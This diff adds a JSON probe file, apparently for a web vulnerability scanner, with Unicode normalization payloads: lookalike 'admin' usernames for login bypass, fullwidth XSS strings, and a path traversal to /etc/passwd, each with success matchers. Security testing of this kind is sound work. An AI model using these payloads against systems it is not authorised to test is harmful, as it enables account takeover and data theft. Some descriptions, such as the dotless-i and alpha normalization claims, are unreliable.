@@ -1,0 +1,99 @@
+{
+  "category": "unicode_normalization",
+  "contexts": {
+    "auth_bypass": {
+      "description": "Unicode normalization bypass in authentication -- NFKC/NFC normalization collapses look-alike characters to ASCII equivalents after validation but before lookup",
+      "tech_match": ["Python", "Django", "Ruby on Rails", "Node.js", "Java"],
+      "param_match": ["username", "user", "login", "email", "name", "account", "id"],
+      "probes": [
+        {
+          "payload": "\u0041\u0064\u006d\u0131\u006e",
+          "description": "Turkish dotless-i bypass -- 'Admın' (dotless i U+0131) normalizes to 'admin' under NFKC in some locales",
+          "matchers": [
+            {"type": "status", "status": [200, 302]},
+            {"type": "not_word", "words": ["not found", "invalid", "does not exist"]}
+          ],
+          "severity": "high",
+          "confidence_boost": 55
+        },
+        {
+          "payload": "\u0251dmin",
+          "description": "Latin alpha bypass -- 'ɑdmin' (U+0251 Latin Small Letter Alpha) may normalize to 'admin'",
+          "matchers": [
+            {"type": "status", "status": [200, 302]},
+            {"type": "not_word", "words": ["not found", "invalid", "does not exist"]}
+          ],
+          "severity": "high",
+          "confidence_boost": 55
+        },
+        {
+          "payload": "\uff41\uff44\uff4d\uff49\uff4e",
+          "description": "Fullwidth 'admin' -- fullwidth Latin letters (U+FF41..U+FF4E) normalize to ASCII under NFKC",
+          "matchers": [
+            {"type": "status", "status": [200, 302]},
+            {"type": "not_word", "words": ["not found", "invalid", "does not exist"]}
+          ],
+          "severity": "high",
+          "confidence_boost": 60
+        }
+      ]
+    },
+    "filter_bypass": {
+      "description": "Unicode normalization to bypass input filters -- fullwidth or confusable characters pass blacklist then normalize to blocked characters",
+      "tech_match": [],
+      "param_match": ["q", "search", "input", "query", "text", "content", "comment", "name", "title"],
+      "probes": [
+        {
+          "payload": "\uff1cscript\uff1ealert(1)\uff1c/script\uff1e",
+          "description": "Fullwidth angle brackets -- U+FF1C (<) and U+FF1E (>) bypass HTML filters, may normalize to ASCII after validation",
+          "matchers": [{"type": "reflection", "check_variants": true}],
+          "severity": "medium",
+          "confidence_boost": 40
+        },
+        {
+          "payload": "\uff1cimg src=x onerror=alert(1)\uff1e",
+          "description": "Fullwidth img tag -- fullwidth < and > bypass filter, normalize to valid HTML after sanitization",
+          "matchers": [{"type": "reflection", "check_variants": true}],
+          "severity": "medium",
+          "confidence_boost": 40
+        },
+        {
+          "payload": "{{baseline}}\u2024/\u2024/etc/passwd",
+          "description": "One-dot leader path traversal -- U+2024 (ONE DOT LEADER) normalizes to period, bypassing ../ filters",
+          "matchers": [
+            {"type": "word", "words": ["root:", "/bin/"], "condition": "or"}
+          ],
+          "severity": "high",
+          "confidence_boost": 50
+        }
+      ]
+    },
+    "case_mapping": {
+      "description": "Unicode case mapping tricks -- special characters that change length or value during case conversion",
+      "tech_match": ["Python", "Node.js", "Ruby", "Java"],
+      "param_match": ["email", "username", "user", "login", "name"],
+      "probes": [
+        {
+          "payload": "admi\u00df",
+          "description": "German Eszett expansion -- U+00DF (ss) expands to 'ss' on uppercase then back to 'ss' on lowercase, may collide with 'admiss' or bypass length checks",
+          "matchers": [
+            {"type": "status", "status": [200, 302]},
+            {"type": "length_diff", "min_diff": 20}
+          ],
+          "severity": "medium",
+          "confidence_boost": 35
+        },
+        {
+          "payload": "ADMIN\u0307",
+          "description": "Combining dot above -- U+0307 added to 'I' causes locale-dependent case mapping (Turkish i/I with dot)",
+          "matchers": [
+            {"type": "status", "status": [200, 302]},
+            {"type": "not_word", "words": ["invalid", "error"]}
+          ],
+          "severity": "medium",
+          "confidence_boost": 30
+        }
+      ]
+    }
+  }
+}
